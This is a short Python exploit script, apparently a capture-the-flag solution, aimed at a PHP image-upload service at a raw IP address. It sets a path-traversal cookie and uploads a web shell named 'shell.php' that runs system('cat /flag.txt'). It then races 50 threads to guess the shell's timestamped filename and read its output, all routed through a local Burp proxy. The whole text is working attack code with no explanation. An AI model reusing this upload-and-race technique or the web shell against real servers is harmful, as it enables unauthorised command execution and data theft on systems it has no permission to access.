import requests
import time
from threading import Thread

proxies = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}
burp0_cookies = {"user": "../www/html/assets/images/"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryab00d82815f3e076c06aa70e2b50ceb7", "Origin": "http://103.97.125.56:31548", "Connection": "keep-alive", "Referer": "http://103.97.125.56:31548/", "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i"}

def upload():
    url = "http://103.97.125.56:31548/index.php"
    burp0_data = "------geckoformboundaryab00d82815f3e076c06aa70e2b50ceb7\r\nContent-Disposition: form-data; name=\"image\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system('cat /flag.txt');?>\r\n------geckoformboundaryab00d82815f3e076c06aa70e2b50ceb7--\r\n"
    requests.post(url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies)
    
def get_shell():
    timestamp = str(int(time.time()) + 2) 
    url = "http://103.97.125.56:31548/assets/images/_" + timestamp + "_shell.php"
    r = requests.get(url, headers=burp0_headers, cookies=burp0_cookies, proxies=proxies)
    if r.status_code == 200:
        print("FOUND")
        print(r.text)
    

def main():
        # Create 50 job
    for job in range(50):
        Thread(target=upload).start()
        Thread(target=get_shell).start()
        
main()